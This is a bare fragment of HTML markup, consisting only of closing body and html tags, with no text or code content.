</body></html>